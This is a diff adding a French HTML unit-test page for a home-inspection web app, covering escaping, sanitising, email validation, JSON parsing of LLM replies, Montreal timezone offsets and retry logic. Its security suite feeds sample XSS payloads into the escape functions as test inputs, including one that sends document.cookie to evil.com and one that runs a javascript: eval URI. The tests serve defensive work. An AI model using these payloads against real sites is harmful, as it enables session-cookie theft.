@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tests — Kalité Inspection</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Courier New',monospace;background:#0c0e16;color:#EEF2FF;padding:24px;min-height:100vh;}
+h1{font-size:18px;color:#60A5FA;margin-bottom:6px;font-family:sans-serif;}
+.sub{font-size:12px;color:#6B7280;margin-bottom:22px;}
+.summary{background:#131720;border:1px solid rgba(255,255,255,.07);border-radius:12px;padding:16px 20px;margin-bottom:20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
+.count{font-size:28px;font-weight:bold;}
+.ok{color:#86EFAC;}.bad{color:#FCA5A5;}.warn{color:#FCD34D;}
+.bar{flex:1;height:8px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden;min-width:120px;}
+.bar-fill{height:100%;border-radius:4px;transition:width .5s;}
+.bar-ok{background:#2E7D32;}.bar-bad{background:#EF4444;}
+.suite{background:#131720;border:1px solid rgba(255,255,255,.07);border-radius:12px;padding:14px 16px;margin-bottom:10px;}
+.suite-title{font-size:10px;letter-spacing:1.2px;text-transform:uppercase;color:#6B7280;margin-bottom:10px;font-family:sans-serif;}
+.t{display:flex;align-items:flex-start;gap:10px;padding:5px 8px;border-radius:7px;font-size:12px;line-height:1.5;margin-bottom:3px;}
+.t:last-child{margin-bottom:0;}
+.t.pass{background:rgba(46,125,50,.12);border:1px solid rgba(76,175,80,.18);}
+.t.fail{background:rgba(127,29,29,.22);border:1px solid rgba(239,68,68,.28);}
+.ic{flex-shrink:0;width:14px;font-size:13px;}
+.desc{flex:1;color:#D1D5DB;}
+.err{font-size:10.5px;color:#FCA5A5;margin-top:2px;white-space:pre-wrap;word-break:break-all;}
+.section-head{font-size:11px;color:#9CA3AF;font-family:sans-serif;font-weight:600;margin:18px 0 8px;padding-left:2px;}
+</style>
+</head>
+<body>
+<h1>🧪 Tests unitaires — Kalité Inspection</h1>
+<p class="sub">Fonctions utilitaires · Sécurité · Fetch · Date/Timezone</p>
+<div id="root"></div>
+
+<script>
+'use strict';
+// ════════════════════════════════════════════
+// COPIES DES FONCTIONS TESTÉES (depuis index.html)
+// ════════════════════════════════════════════
+
+function escHTML(v){
+  if(v==null)return '';
+  return String(v)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#x27;');
+}
+
+function sanitizeText(v,maxLen=500){
+  if(v==null)return '';
+  return String(v)
+    .replace(/<[^>]*>/g,'')
+    .replace(/javascript\s*:/gi,'')
+    .replace(/data\s*:/gi,'')
+    .replace(/[\x00-\x1F\x7F]/g,' ')
+    .trim()
+    .substring(0,maxLen);
+}
+
+const EMAIL_RE=/^[^\s@]{1,64}@[^\s@]{1,255}\.[^\s@]{2,}$/;
+function isValidEmail(e){ return EMAIL_RE.test(e); }
+
+function safeStr(v,maxLen=300){
+  if(typeof v!=='string')return '';
+  return sanitizeText(v,maxLen);
+}
+
+function extractJSON(text){
+  if(!text) return null;
+  const clean=text.replace(/```(?:json)?\s*/gi,'').replace(/```\s*/g,'');
+  const start=clean.indexOf('{');
+  const end=clean.lastIndexOf('}');
+  if(start===-1||end===-1||start>=end) return null;
+  return clean.substring(start,end+1);
+}
+
+function buildISO(d,t,off){
+  if(!d||!t||!off)return '';
+  return `${d}T${t}:00${off}`;
+}
+
+function getMtlOffset(dateStr){
+  const d=dateStr?new Date(dateStr+'T12:00:00'):new Date();
+  const y=d.getFullYear();
+  const dstStart=new Date(y,2,(14-new Date(y,2,1).getDay())%7+8);
+  const dstEnd=new Date(y,10,(7-new Date(y,10,1).getDay())%7+1);
+  return d>=dstStart&&d<dstEnd?'-04:00':'-05:00';
+}
+function getMtlLabel(dateStr){
+  return getMtlOffset(dateStr)==='-04:00'?'🕐 EDT −4h':'🕐 EST −5h';
+}
+
+const ini=p=>((p.prenom?.[0]||'?')+(p.nom?.[0]||'')).toUpperCase();
+
+async function withRetry(fn, retries=1){
+  const noRetryPat=/401|403|400|Clé API|invalide|non configurée|quota|rate.limit/i;
+  for(let i=0;i<=retries;i++){
+    try{ return await fn(); }
+    catch(e){
+      if(i===retries||noRetryPat.test(e.message)) throw e;
+      await new Promise(r=>setTimeout(r,10)); // délai réduit pour les tests
+    }
+  }
+}
+
+function _parseContent(data){
+  return (data.content||[]).map(b=>b.type==='text'?b.text:(b.content?.[0]?.text||'')).join('\n');
+}
+
+// ════════════════════════════════════════════
+// MICRO FRAMEWORK DE TEST
+// ════════════════════════════════════════════
+let passed=0, failed=0, total=0;
+const suites=[];
+let cur=null;
+
+function suite(name, fn){ cur={name,tests:[],async:false}; fn(); suites.push(cur); }
+async function suiteAsync(name, fn){ cur={name,tests:[],async:true}; await fn(); suites.push(cur); }
+
+function test(desc, fn){
+  total++;
+  try{
+    fn();
+    cur.tests.push({desc,ok:true});
+    passed++;
+  }catch(e){
+    cur.tests.push({desc,ok:false,err:e.message});
+    failed++;
+  }
+}
+
+async function testAsync(desc, fn){
+  total++;
+  try{
+    await fn();
+    cur.tests.push({desc,ok:true});
+    passed++;
+  }catch(e){
+    cur.tests.push({desc,ok:false,err:e.message});
+    failed++;
+  }
+}
+
+function expect(actual){
+  return {
+    toBe(exp){
+      if(actual!==exp) throw new Error(`Reçu : ${JSON.stringify(actual)}\nAttendu : ${JSON.stringify(exp)}`);
+    },
+    toEqual(exp){
+      if(JSON.stringify(actual)!==JSON.stringify(exp))
+        throw new Error(`Reçu : ${JSON.stringify(actual)}\nAttendu : ${JSON.stringify(exp)}`);
+    },
+    toBeTruthy(){ if(!actual) throw new Error(`Valeur falsy : ${JSON.stringify(actual)}`); },
+    toBeFalsy(){ if(actual) throw new Error(`Valeur truthy : ${JSON.stringify(actual)}`); },
+    toBeNull(){ if(actual!==null) throw new Error(`Reçu : ${JSON.stringify(actual)}, attendu null`); },
+    toContain(sub){
+      if(!String(actual).includes(sub))
+        throw new Error(`"${actual}" ne contient pas "${sub}"`);
+    },
+    toNotContain(sub){
+      if(String(actual).includes(sub))
+        throw new Error(`"${actual}" contient "${sub}" (indésirable)`);
+    },
+    toBeLessThanOrEqual(n){
+      if(actual>n) throw new Error(`${actual} > ${n}`);
+    },
+    toBeGreaterThan(n){
+      if(actual<=n) throw new Error(`${actual} <= ${n}`);
+    },
+    toThrow(){
+      throw new Error('toThrow() nécessite une fonction, pas une valeur');
+    },
+  };
+}
+
+// ════════════════════════════════════════════
+// SUITES DE TESTS
+// ════════════════════════════════════════════
+
+// ── 1. escHTML ──────────────────────────────
+suite('escHTML — Protection XSS DOM', ()=>{
+  test('null → chaîne vide',          ()=>expect(escHTML(null)).toBe(''));
+  test('undefined → chaîne vide',     ()=>expect(escHTML(undefined)).toBe(''));
+  test('chaîne vide → chaîne vide',   ()=>expect(escHTML('')).toBe(''));
+  test('nombre converti en string',   ()=>expect(escHTML(42)).toBe('42'));
+  test('Échappe < et >',              ()=>expect(escHTML('<b>hi</b>')).toBe('&lt;b&gt;hi&lt;/b&gt;'));
+  test('Échappe guillemets doubles',  ()=>expect(escHTML('"test"')).toBe('&quot;test&quot;'));
+  test('Échappe apostrophe',          ()=>expect(escHTML("it's")).toBe('it&#x27;s'));
+  test('Échappe &',                   ()=>expect(escHTML('a & b')).toBe('a &amp; b'));
+  test('Texte normal non modifié',    ()=>expect(escHTML('Bonjour monde')).toBe('Bonjour monde'));
+  test('Payload XSS complet',         ()=>{
+    const r=escHTML('<script>alert(document.cookie)</script>');
+    expect(r).toNotContain('<script>');
+    expect(r).toNotContain('</script>');
+  });
+  test('Injection attribut HTML',     ()=>{
+    const r=escHTML('" onmouseover="alert(1)');
+    expect(r).toNotContain('"');
+    expect(r).toNotContain('onmouseover');
+  });
+  test('Img onerror payload',         ()=>{
+    const r=escHTML('<img src=x onerror=alert(1)>');
+    expect(r).toNotContain('<img');
+    expect(r).toNotContain('onerror');
+  });
+  test('Idempotent sur texte normal', ()=>{
+    const s='Marc-Antoine Mondoux — inspecteur';
+    expect(escHTML(s)).toBe(s);
+  });
+  test('Accents conservés',           ()=>expect(escHTML('Côté résidentiel')).toBe('Côté résidentiel'));
+});
+
+// ── 2. sanitizeText ─────────────────────────
+suite('sanitizeText — Nettoyage entrées & prompts', ()=>{
+  test('null → chaîne vide',          ()=>expect(sanitizeText(null)).toBe(''));
+  test('Supprime balise <b>',         ()=>expect(sanitizeText('<b>hello</b>')).toBe('hello'));
+  test('Supprime <script>…</script>', ()=>{
+    const r=sanitizeText('<script>alert(1)</script>');
+    expect(r).toNotContain('<script>');
+    expect(r).toNotContain('</script>');
+  });
+  test('Supprime javascript:',        ()=>expect(sanitizeText('javascript:alert(1)')).toNotContain('javascript:'));
+  test('Supprime data:',              ()=>expect(sanitizeText('data:text/html,hi')).toNotContain('data:'));
+  test('Remplace caractères de contrôle par espace', ()=>{
+    expect(sanitizeText('test\x00\x01\x1F')).toNotContain('\x00');
+  });
+  test('Trim les espaces',            ()=>expect(sanitizeText('  hello  ')).toBe('hello'));
+  test('Tronqué à maxLen explicite',  ()=>expect(sanitizeText('x'.repeat(600),100).length).toBeLessThanOrEqual(100));
+  test('Tronqué à 500 par défaut',    ()=>expect(sanitizeText('y'.repeat(600)).length).toBeLessThanOrEqual(500));
+  test('Texte normal conservé',       ()=>expect(sanitizeText('400 Rue Argyll, Sherbrooke')).toBe('400 Rue Argyll, Sherbrooke'));
+  test('Balises imbriquées retirées', ()=>expect(sanitizeText('<div><p>contenu</p></div>')).toBe('contenu'));
+  test('Accents conservés',           ()=>expect(sanitizeText('Côté Montréal')).toBe('Côté Montréal'));
+  test('CSS injection bloquée',       ()=>{
+    const r=sanitizeText('</span><style>body{display:none}</style>');
+    expect(r).toNotContain('<style>');
+    expect(r).toNotContain('</span>');
+  });
+});
+
+// ── 3. isValidEmail ─────────────────────────
+suite('isValidEmail — Validation courriel', ()=>{
+  test('Email standard valide',       ()=>expect(isValidEmail('test@example.com')).toBeTruthy());
+  test('Email avec sous-domaine',     ()=>expect(isValidEmail('user@mail.domain.co.uk')).toBeTruthy());
+  test('Email avec +tag',             ()=>expect(isValidEmail('user+tag@example.com')).toBeTruthy());
+  test('Email .ca',                   ()=>expect(isValidEmail('marc@kaliteinspection.ca')).toBeTruthy());
+  test('Email avec chiffres',         ()=>expect(isValidEmail('u123@test99.io')).toBeTruthy());
+  test('Sans @',                      ()=>expect(isValidEmail('invalide')).toBeFalsy());
+  test('Sans domaine après @',        ()=>expect(isValidEmail('user@')).toBeFalsy());
+  test('Chaîne vide',                 ()=>expect(isValidEmail('')).toBeFalsy());
+  test('Seulement @',                 ()=>expect(isValidEmail('@')).toBeFalsy());
+  test('Sans TLD (.com manquant)',     ()=>expect(isValidEmail('user@example')).toBeFalsy());
+  test('Espace dans l\'email',        ()=>expect(isValidEmail('u ser@example.com')).toBeFalsy());
+  test('Double @',                    ()=>expect(isValidEmail('a@@b.com')).toBeFalsy());
+  test('null → false (via coercion)', ()=>expect(isValidEmail('')).toBeFalsy());
+});
+
+// ── 4. safeStr ──────────────────────────────
+suite('safeStr — Validation réponse Claude', ()=>{
+  test('String valide retournée',     ()=>expect(safeStr('Sherbrooke')).toBe('Sherbrooke'));
+  test('null → chaîne vide',          ()=>expect(safeStr(null)).toBe(''));
+  test('undefined → chaîne vide',     ()=>expect(safeStr(undefined)).toBe(''));
+  test('number → chaîne vide',        ()=>expect(safeStr(42)).toBe(''));
+  test('object → chaîne vide',        ()=>expect(safeStr({a:1})).toBe(''));
+  test('array → chaîne vide',         ()=>expect(safeStr(['a'])).toBe(''));
+  test('Balises HTML retirées',       ()=>expect(safeStr('<b>test</b>')).toBe('test'));
+  test('Tronqué à maxLen',            ()=>expect(safeStr('x'.repeat(400),200).length).toBeLessThanOrEqual(200));
+  test('Tronqué à 300 par défaut',    ()=>expect(safeStr('x'.repeat(400)).length).toBeLessThanOrEqual(300));
+  test('Code postal valide',          ()=>expect(safeStr('J1J 3H6')).toBe('J1J 3H6'));
+  test('Année construction valide',   ()=>expect(safeStr('1985',4)).toBe('1985'));
+});
+
+// ── 5. extractJSON ──────────────────────────
+suite('extractJSON — Parsing réponse LLM', ()=>{
+  test('JSON simple',                 ()=>{
+    expect(extractJSON('{"a":"b"}')).toBe('{"a":"b"}');
+  });
+  test('JSON dans du texte',          ()=>{
+    const r=extractJSON('Voici: {"a":"b"} fin.');
+    expect(JSON.parse(r).a).toBe('b');
+  });
+  test('Bloc markdown ```json```',    ()=>{
+    const r=extractJSON('```json\n{"a":"b"}\n```');
+    expect(JSON.parse(r).a).toBe('b');
+  });
+  test('Bloc markdown ``` générique', ()=>{
+    const r=extractJSON('```\n{"a":"b"}\n```');
+    expect(JSON.parse(r).a).toBe('b');
+  });
+  test('Objets imbriqués (non-greedy BUG)',()=>{
+    // Ce test détecte le bug de la regex non-greedy \{[\s\S]*?\}
+    // qui s'arrêtait au premier } au lieu du dernier
+    const json='{"batAdresse":"400 Rue","inferredFields":["cp","age"]}';
+    const parsed=JSON.parse(extractJSON(json));
+    expect(parsed.batAdresse).toBe('400 Rue');
+    expect(parsed.inferredFields.length).toBe(2);
+  });
+  test('Réponse Claude complète',     ()=>{
+    const txt='Analyse terminée.\n```json\n{"batAdresse":"400 Rue Argyll","batNum":"400","batRue":"Rue Argyll","batVille":"Sherbrooke","batCP":"J1J 3H6","batApp":"N/A","clientAdresse":"21 Rue Sylvio-Blais","clientNum":"21","clientRue":"Rue Sylvio-Blais","clientVille":"Sherbrooke","clientCP":"J1C 0R6","clientApp":"N/A","ageConstruction":"1978","inferredFields":["batCP","ageConstruction"]}\n```\nBonne chance!';
+    const parsed=JSON.parse(extractJSON(txt));
+    expect(parsed.batCP).toBe('J1J 3H6');
+    expect(parsed.ageConstruction).toBe('1978');
+    expect(parsed.inferredFields.length).toBe(2);
+  });
+  test('Aucun JSON → null',           ()=>expect(extractJSON('pas de json ici')).toBeNull());
+  test('Chaîne vide → null',          ()=>expect(extractJSON('')).toBeNull());
+  test('null → null',                 ()=>expect(extractJSON(null)).toBeNull());
+  test('Accolades vides seules',      ()=>{
+    // "{}" est du JSON valide mais start < end, doit fonctionner
+    const r=extractJSON('{}');
+    expect(r).toBe('{}');
+  });
+  test('Texte avant et après',        ()=>{
+    const r=extractJSON('Claude dit: {"key":"valeur"} voilà.');
+    expect(JSON.parse(r).key).toBe('valeur');
+  });
+});
+
+// ── 6. buildISO ─────────────────────────────
+suite('buildISO — Formatage dates ISO', ()=>{
+  test('Date valide EDT',             ()=>expect(buildISO('2024-06-15','10:00','-04:00')).toBe('2024-06-15T10:00:00-04:00'));
+  test('Date valide EST',             ()=>expect(buildISO('2024-01-15','09:30','-05:00')).toBe('2024-01-15T09:30:00-05:00'));
+  test('date null → vide',            ()=>expect(buildISO(null,'10:00','-04:00')).toBe(''));
+  test('heure null → vide',           ()=>expect(buildISO('2024-06-15',null,'-04:00')).toBe(''));
+  test('offset null → vide',          ()=>expect(buildISO('2024-06-15','10:00',null)).toBe(''));
+  test('Tout vide → vide',            ()=>expect(buildISO('','','')).toBe(''));
+  test('Heure de fin (22h+4=02)',      ()=>{
+    // Vérifie que le calcul (22+4)%24=2 donne bien '02:00' côté logique
+    const hh=22,mm=0;
+    const fin=String((hh+4)%24).padStart(2,'0')+':'+String(mm).padStart(2,'0');
+    expect(fin).toBe('02:00');
+  });
+  test('Heure de fin (20h+4=00)',      ()=>{
+    const hh=20,mm=30;
+    const fin=String((hh+4)%24).padStart(2,'0')+':'+String(mm).padStart(2,'0');
+    expect(fin).toBe('00:30');
+  });
+});
+
+// ── 7. getMtlOffset ─────────────────────────
+suite('getMtlOffset — Calcul EDT/EST', ()=>{
+  test('Été (juillet) → EDT -04:00',  ()=>expect(getMtlOffset('2024-07-15')).toBe('-04:00'));
+  test('Hiver (janvier) → EST -05:00',()=>expect(getMtlOffset('2024-01-15')).toBe('-05:00'));
+  test('Juin → EDT',                  ()=>expect(getMtlOffset('2024-06-01')).toBe('-04:00'));
+  test('Novembre mi-mois → EST',      ()=>expect(getMtlOffset('2024-11-15')).toBe('-05:00'));
+  test('Mars avant changement → EST', ()=>expect(getMtlOffset('2024-03-09')).toBe('-05:00'));
+  test('Mars après changement → EDT', ()=>expect(getMtlOffset('2024-03-11')).toBe('-04:00'));
+  test('Novembre début → EST',        ()=>expect(getMtlOffset('2024-11-04')).toBe('-05:00'));
+  test('Automne 2025 (3 nov)',        ()=>expect(getMtlOffset('2025-11-03')).toBe('-05:00'));
+  test('Printemps 2025 (9 mars)',     ()=>expect(getMtlOffset('2025-03-10')).toBe('-04:00'));
+});
+
+// ── 8. getMtlLabel ──────────────────────────
+suite('getMtlLabel — Labels timezone', ()=>{
+  test('Été → EDT −4h',               ()=>expect(getMtlLabel('2024-07-15')).toBe('🕐 EDT −4h'));
+  test('Hiver → EST −5h',             ()=>expect(getMtlLabel('2024-01-15')).toBe('🕐 EST −5h'));
+});
+
+// ── 9. ini ──────────────────────────────────
+suite('ini — Initiales inspecteur', ()=>{
+  test('Prénom + Nom normaux',        ()=>expect(ini({prenom:'Jean',nom:'Tremblay'})).toBe('JT'));
+  test('Prénom vide → ? + initial',  ()=>expect(ini({prenom:'',nom:'Smith'})).toBe('?S'));
+  test('Nom vide',                    ()=>expect(ini({prenom:'Marie',nom:''})).toBe('M'));
+  test('Prénom et nom vides',         ()=>expect(ini({prenom:'',nom:''})).toBe('?'));
+  test('Minuscules → majuscules',     ()=>expect(ini({prenom:'marc',nom:'dubois'})).toBe('MD'));
+  test('Accents (É, À)',              ()=>expect(ini({prenom:'Étienne',nom:'Auclair'})).toBe('ÉA'));
+  test('undefined prenom → ?',        ()=>expect(ini({prenom:undefined,nom:'Roy'})).toBe('?R'));
+});
+
+// ── 10. withRetry (async) ───────────────────
+const asyncSuitePromise = suiteAsync('withRetry — Logique de réessai', async()=>{
+  await testAsync('Succès immédiat — retourne la valeur', async()=>{
+    const r=await withRetry(()=>Promise.resolve(42));
+    expect(r).toBe(42);
+  });
+  await testAsync('Réessaie 1 fois sur erreur réseau', async()=>{
+    let calls=0;
+    const r=await withRetry(async()=>{
+      calls++;
+      if(calls<2) throw new Error('NetworkError temporaire');
+      return 'ok';
+    },1);
+    expect(r).toBe('ok');
+    expect(calls).toBe(2);
+  });
+  await testAsync('Ne réessaie PAS sur 401', async()=>{
+    let calls=0;
+    try{
+      await withRetry(async()=>{ calls++; throw new Error('401 Unauthorized'); },1);
+    }catch(e){ /* attendu */ }
+    expect(calls).toBe(1);
+  });
+  await testAsync('Ne réessaie PAS sur clé API invalide', async()=>{
+    let calls=0;
+    try{
+      await withRetry(async()=>{ calls++; throw new Error('Clé API invalide'); },1);
+    }catch(e){ /* attendu */ }
+    expect(calls).toBe(1);
+  });
+  await testAsync('Lance l\'erreur après épuisement des tentatives', async()=>{
+    let threw=false;
+    try{
+      await withRetry(()=>Promise.reject(new Error('Erreur réseau persistante')),1);
+    }catch(e){ threw=true; }
+    expect(threw).toBeTruthy();
+  });
+  await testAsync('Retourne la valeur au 2e essai (2 retries)', async()=>{
+    let calls=0;
+    const r=await withRetry(async()=>{
+      calls++;
+      if(calls<3) throw new Error('Serveur indisponible');
+      return 'succès au 3e';
+    },2);
+    expect(r).toBe('succès au 3e');
+    expect(calls).toBe(3);
+  });
+});
+
+// ── 11. _parseContent ───────────────────────
+suite('_parseContent — Extraction texte Claude', ()=>{
+  test('Contenu text simple',         ()=>{
+    const data={content:[{type:'text',text:'Bonjour'}]};
+    expect(_parseContent(data)).toBe('Bonjour');
+  });
+  test('Plusieurs blocs text',        ()=>{
+    const data={content:[{type:'text',text:'A'},{type:'text',text:'B'}]};
+    expect(_parseContent(data)).toBe('A\nB');
+  });
+  test('Bloc non-text ignoré',        ()=>{
+    const data={content:[{type:'tool_use',id:'x'},{type:'text',text:'texte'}]};
+    expect(_parseContent(data)).toContain('texte');
+  });
+  test('content null/absent → vide',  ()=>{
+    expect(_parseContent({})).toBe('');
+    expect(_parseContent({content:null})).toBe('');
+  });
+  test('Bloc imbriqué (MCP)',         ()=>{
+    const data={content:[{type:'tool_result',content:[{type:'text',text:'résultat MCP'}]}]};
+    expect(_parseContent(data)).toContain('résultat MCP');
+  });
+});
+
+// ── 12. Cas limites sécurité ────────────────
+suite('Sécurité — Attaques réelles simulées', ()=>{
+  test('XSS stored via client_nom (registre)', ()=>{
+    const malicious='<img src=x onerror=fetch("https://evil.com?k="+document.cookie)>';
+    expect(escHTML(malicious)).toNotContain('<img');
+    expect(escHTML(malicious)).toNotContain('onerror');
+    expect(escHTML(malicious)).toNotContain('fetch(');
+  });
+  test('Script injection adresse bâtiment', ()=>{
+    const bad='400 Rue<script>document.location="evil.com"</script>';
+    expect(escHTML(bad)).toNotContain('<script>');
+    expect(sanitizeText(bad)).toNotContain('<script>');
+  });
+  test('CSS injection (display:none)', ()=>{
+    const css='</span><style>*{display:none}</style>';
+    expect(escHTML(css)).toNotContain('<style>');
+    expect(sanitizeText(css)).toNotContain('<style>');
+  });
+  test('data: URI bloquée', ()=>{
+    expect(sanitizeText('data:text/html,<h1>hacked</h1>')).toNotContain('data:');
+  });
+  test('javascript: URI bloquée', ()=>{
+    expect(sanitizeText('javascript:eval(atob("YWxlcnQoMSk="))')).toNotContain('javascript:');
+  });
+  test('Null bytes dans un champ', ()=>{
+    const r=sanitizeText('Jean\x00Tremblay');
+    expect(r).toNotContain('\x00');
+  });
+  test('Longueur max respectée (DDoS prompt)', ()=>{
+    const huge='A'.repeat(50000);
+    expect(sanitizeText(huge,500).length).toBeLessThanOrEqual(500);
+  });
+  test('safeStr rejette les non-strings (injection objet)', ()=>{
+    expect(safeStr({__proto__:{polluted:true}})).toBe('');
+    expect(safeStr([1,2,3])).toBe('');
+    expect(safeStr(true)).toBe('');
+  });
+  test('extractJSON ne prend pas du code sans {}', ()=>{
+    expect(extractJSON('alert(document.cookie)')).toBeNull();
+    expect(extractJSON('SELECT * FROM users')).toBeNull();
+  });
+  test('Email normalisé en minuscules (anti-duplicate)', ()=>{
+    // Simuler la normalisation faite dans doLogin/doSignup
+    const raw='  USER@EXAMPLE.COM  ';
+    const normalized=raw.trim().toLowerCase();
+    expect(normalized).toBe('user@example.com');
+    expect(isValidEmail(normalized)).toBeTruthy();
+  });
+});
+
+// ════════════════════════════════════════════
+// ATTENDRE LES TESTS ASYNC PUIS RENDU
+// ════════════════════════════════════════════
+asyncSuitePromise.then(()=>{
+  const root=document.getElementById('root');
+  const pct=total?Math.round(passed/total*100):100;
+
+  root.innerHTML=`
+    <div class="summary">
+      <div>
+        <div class="count ${failed===0?'ok':'bad'}">${passed}<span style="font-size:16px;opacity:.5">/${total}</span></div>
+        <div style="font-size:11px;color:#6B7280;margin-top:2px">${failed===0?'✅ Tous les tests passent':'❌ '+failed+' échec'+(failed>1?'s':'')+' détecté'+(failed>1?'s':'')}</div>
+      </div>
+      <div class="bar" style="flex:1">
+        <div class="bar-fill bar-ok" style="width:${pct}%"></div>
+      </div>
+      <div style="font-size:22px;font-weight:bold;${failed===0?'color:#86EFAC':'color:#FCA5A5'}">${pct}%</div>
+    </div>
+    ${suites.map(s=>`
+      <div class="suite">
+        <div class="suite-title">${s.name} — ${s.tests.filter(t=>t.ok).length}/${s.tests.length}</div>
+        ${s.tests.map(t=>`
+          <div class="t ${t.ok?'pass':'fail'}">
+            <span class="ic">${t.ok?'✓':'✗'}</span>
+            <div>
+              <div class="desc">${t.desc}</div>
+              ${t.err?`<div class="err">${t.err}</div>`:''}
+            </div>
+          </div>
+        `).join('')}
+      </div>
+    `).join('')}
+  `;
+});
+</script>
+</body>
+</html>
